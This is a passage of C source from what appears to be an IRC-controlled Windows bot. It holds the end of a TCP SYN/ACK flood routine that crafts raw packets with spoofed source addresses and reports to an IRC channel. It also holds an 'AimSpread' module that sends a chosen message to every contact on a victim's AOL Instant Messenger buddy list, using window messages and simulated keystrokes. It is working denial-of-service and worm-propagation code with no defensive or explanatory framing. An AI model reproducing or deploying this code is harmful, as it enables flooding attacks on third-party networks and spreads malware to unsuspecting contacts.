	if (inet_addr(info.target) == INADDR_NONE)
	{
		wsprintf(buffer, "PRIVMSG %s :Invalid target IP.\r\n", channel, WSAGetLastError());
		send(sock, buffer, lstrlen(buffer), 0);
		return 0;
	}
	addr_in.sin_family=AF_INET; 
	addr_in.sin_port=htons(0); 
	addr_in.sin_addr.s_addr=inet_addr(info.target); 
	start = GetTickCount();
	wsprintf(buffer, "PRIVMSG %s :Sending packets to %s...\r\n", channel, info.target);
	send(sock, buffer, lstrlen(buffer), 0);
	sent = 0;
	while (((GetTickCount() - start) / 1000) <= (unsigned long)info.time)
	{
		if (!spoofing) 
		{
			sas = sizeof(sa);
			memset(&sa, 0, sizeof(sa));
			getsockname(sock, &sa, &sas);
			sprintf(ip, "%d.%d.%d.%d", (BYTE)sa.sa_data[2], (BYTE)sa.sa_data[3], (BYTE)sa.sa_data[4], rand()%255);
		}
		else
		{
			strcpy(ip, spoof);
		}
		ipHeader.h_verlen=(4<<4 | sizeof(ipHeader)/sizeof(unsigned long)); 
		ipHeader.total_len=htons(sizeof(ipHeader)+sizeof(tcpHeader)); 
		ipHeader.ident=1; 
		ipHeader.frag_and_flags=0; 
		ipHeader.ttl=255; 
		ipHeader.proto=IPPROTO_TCP; 
		ipHeader.checksum=0; 
		ipHeader.sourceIP=inet_addr(ip); 
		ipHeader.destIP=addr_in.sin_addr.s_addr; 
		if (info.port == 0) tcpHeader.th_dport=htons(rand()%1025);
		else tcpHeader.th_dport=htons(info.port); 
		tcpHeader.th_sport=htons(rand()%1025);  
		tcpHeader.th_seq=htonl(0x12000068+sent); 
		if (lstrcmp(info.type,"syn") == 0) 
		{
			tcpHeader.th_ack=0;
			tcpHeader.th_flag=SYN;
		}
		if (lstrcmp(info.type,"ack") == 0)
		{
			tcpHeader.th_ack=0;
			tcpHeader.th_flag=ACK;
		}
		if (lstrcmp(info.type,"random") == 0)
		{
			tcpHeader.th_ack=rand()%3;
			if (rand()%2 == 0) tcpHeader.th_flag=SYN;
			else tcpHeader.th_flag=ACK;
		}
		tcpHeader.th_lenres=(sizeof(tcpHeader)/4<<4|0); 
		tcpHeader.th_win=htons(4096); 
		tcpHeader.th_urp=0; 
		tcpHeader.th_sum=0; 
		psdHeader.saddr=ipHeader.sourceIP; 
		psdHeader.daddr=ipHeader.destIP; 
		psdHeader.mbz=0; 
		psdHeader.ptcl=IPPROTO_TCP; 
		psdHeader.tcpl=htons(sizeof(tcpHeader)); 
		memcpy(szSendBuf, &psdHeader, sizeof(psdHeader)); 
		memcpy(szSendBuf+sizeof(psdHeader), &tcpHeader, sizeof(tcpHeader)); 
		tcpHeader.th_sum=checksum((USHORT *)szSendBuf,sizeof(psdHeader)+sizeof(tcpHeader)); 
		memcpy(szSendBuf, &ipHeader, sizeof(ipHeader)); 
		memcpy(szSendBuf+sizeof(ipHeader), &tcpHeader, sizeof(tcpHeader)); 
		memset(szSendBuf+sizeof(ipHeader)+sizeof(tcpHeader), 0, 4); 
		ipHeader.checksum=checksum((USHORT *)szSendBuf, sizeof(ipHeader)+sizeof(tcpHeader)); 
		memcpy(szSendBuf, &ipHeader, sizeof(ipHeader)); 
		ret=sendto(ssock, (char *)&szSendBuf, sizeof(szSendBuf), 0, (SOCKADDR *)&addr_in, sizeof(addr_in)); 
		if (ret==SOCKET_ERROR) 
		{
			wsprintf(buffer, "PRIVMSG %s :Error sending packets to %s. eax=SOCKET_ERROR, WSAGetLastError()=%d. sizeof(buffer) = %d. Packets sent sucessfully = %d.\r\n", channel, info.target, WSAGetLastError(), sizeof(szSendBuf), sent);
			send(sock, buffer, lstrlen(buffer), 0);
			return 0;
		}
		sent++;
		Sleep(500); // keeps a good modem from dying
	}
	closesocket(ssock);
	wsprintf(buffer, "PRIVMSG %s :Finished sending packets to %s. Sent %d packet(s). ~%dMB of data sent (~%dK/s).\r\n", channel, info.target, sent, (((sent * sizeof(szSendBuf)) / 1024) / 1024), (((sent * sizeof(szSendBuf)) / 1024) / info.time));
	send(sock, buffer, lstrlen(buffer), 0);
	return 0;
}

/* AimSpread */
DWORD WINAPI AIMSpread (void *pVoid)
{

   AIMSPREAD AIM = *((AIMSPREAD *)pVoid);

   AIMSPREAD *pAIM = (AIMSPREAD *)pVoid;
   pAIM->bGotInfo = TRUE;

   HWND hBuddyList = FindBuddyList();
   if ( IsWindow(hBuddyList) )
      IMAll( hBuddyList, AIM.pszMessage );
   if (hBuddyList)
      CloseHandle( hBuddyList );
   if (pAIM)
      free(pAIM);
   return 0;

}


HWND FindBuddyList()
{
   HWND oscarNotify = FindWindow("_Oscar_StatusNotify", NULL);
   if ( IsWindow(oscarNotify) )
   {
      SendMessage(oscarNotify, WM_COMMAND, 20003, 0);

      HWND buddyList = 0;
      HWND aimAd = 0;
      do
      {
         buddyList = FindWindowEx(0, buddyList, "#32770", NULL);
         if ( IsWindow(buddyList) )
         {
            aimAd = FindWindowEx(buddyList, 0, "_AimAd", NULL);
            if ( IsWindow(aimAd) )
            {
               return buddyList;
            }
         }
      }
      while ( IsWindow(buddyList) );
   }
   return 0;
}
void SendIM(HWND imWindow, LPCTSTR message)
{
   HWND textBox = 0;
   HWND wndAte = 0;
   do
   {
      wndAte = FindWindowEx(imWindow, wndAte, "WndAte32Class", NULL);
      if ( IsWindow(wndAte) )
      {
            textBox = FindWindowEx(wndAte, 0, "CBClass", NULL);
         if ( IsWindow(textBox) )
         {
            textBox = FindWindowEx(wndAte, 0, "Ate32Class", NULL);
            SendMessage(textBox, WM_SETTEXT, 0, (LPARAM)message);
            wndAte = 0;
         }
      }
   }
   while ( IsWindow(wndAte) );
   do
   {
      wndAte = FindWindowEx(imWindow, wndAte, "_Oscar_IconBtn", NULL);
      if ( IsWindow(wndAte) )
      {
         if ( ((int)GetMenu(wndAte)) == 409 )
         {
            SendMessage(wndAte, WM_LBUTTONDOWN, 0, 0);
            SendMessage(wndAte, WM_LBUTTONUP, 0, 0);
            wndAte = 0;
         }
      }
   }
   while ( IsWindow(wndAte) );
}
void IMAllWindows(LPCTSTR message)
{
   HWND imWindow = 0;
   do
   {
      imWindow = FindWindowEx(0, 0, "AIM_IMessage", NULL);
      if ( IsWindow(imWindow) )
      {
         SendIM(imWindow, message);
         SendMessage(imWindow, WM_CLOSE, 0, 0);
      }
      Sleep(4000);
   }
   while ( IsWindow(imWindow) );
}

void IMAll(HWND buddyList, LPCTSTR message)
{
   HWND oscarTree = FindWindowEx(buddyList, 0, "#32770", NULL);
   oscarTree = FindWindowEx(oscarTree, 0, "_Oscar_Tree", NULL);
   if ( IsWindow(oscarTree) )
   {
      int itemCount = SendMessage(oscarTree, LB_GETCOUNT, 0, 0);
      int itemIndex = -1;
      while ( itemCount > itemIndex )
      {
         SendMessage(oscarTree, LB_SETCURSEL, ++itemIndex, 0);
         SendMessage(oscarTree, WM_KEYDOWN, 37, 0);

         SendMessage(oscarTree, WM_KEYUP, 37, 0);
      }

      itemCount = SendMessage(oscarTree, LB_GETCOUNT, 0, 0);
      itemIndex = itemCount;
      --itemIndex;
      while (( --itemIndex >= 0 ))
      {
         SendMessage(oscarTree, LB_SETCURSEL, itemIndex, 0);
         SendMessage(oscarTree, WM_KEYDOWN, 39, 0);
         SendMessage(oscarTree, WM_KEYUP, 39, 0);
         int temp = SendMessage(oscarTree, LB_GETCOUNT, 0, 0);
         temp -= ( itemCount - itemIndex );
         for ( int i = itemIndex + 1; i <= temp; ++i )
         {
            SendMessage(oscarTree, LB_SETCURSEL, i, 0);
            SendMessage(buddyList, WM_COMMAND, 139, 0);
            IMAllWindows(message);
         }
         
         SendMessage(oscarTree, LB_SETCURSEL, itemIndex, 0);
         SendMessage(oscarTree, WM_KEYDOWN, 37, 0);
         SendMessage(oscarTree, WM_KEYUP, 37, 0);
         SendMessage(oscarTree, LB_SETCURSEL, itemIndex, 0);
      }
   }
}


void typetext(HWND hwnd, int msngrwindow, LPCTSTR Sploitmsg)
{
   if(msngrwindow != 0)
   {
      ShowWindow(hwnd, SW_SHOW);
      activatefocus(hwnd);
      cleartext();

      Sleep(10);
      for(int x = 0; x < strlen(Sploitmsg); x++)
      {
         keybd_event(VkKeyScan((char)Sploitmsg[x]),0,0 , 0);
         keybd_event(VkKeyScan((char)Sploitmsg[x]),0, KEYEVENTF_KEYUP,0);
      }
      
      activatefocus(hwnd);
      sendtext(msngrwindow);

   }
   return;
}

void sendtext(int msngrwindow)
{
   if(msngrwindow == 2)
      keybd_event(VK_CONTROL,0,0 , 0);
   keybd_event(VK_RETURN,0,0 , 0);
   keybd_event(VK_RETURN,0,KEYEVENTF_KEYUP , 0);
   keybd_event(VK_CONTROL,0,KEYEVENTF_KEYUP , 0);

   return;
}

void activatefocus(HWND hwnd)
{
      BringWindowToTop(hwnd);
      SetForegroundWindow(hwnd);
      SetFocus(hwnd);
   return;
}

void cleartext()
{
   keybd_event(VK_CONTROL,0,0 , 0);
   keybd_event(VkKeyScan('a'),0,0 , 0);
   keybd_event(VK_DELETE,0,0 , 0);

   keybd_event(VK_CONTROL,0,KEYEVENTF_KEYUP , 0);
   keybd_event(VkKeyScan('a'),0,KEYEVENTF_KEYUP , 0);
   keybd_event(VK_DELETE,0,KEYEVENTF_KEYUP , 0);

   return;
}

// end of aimspread // 
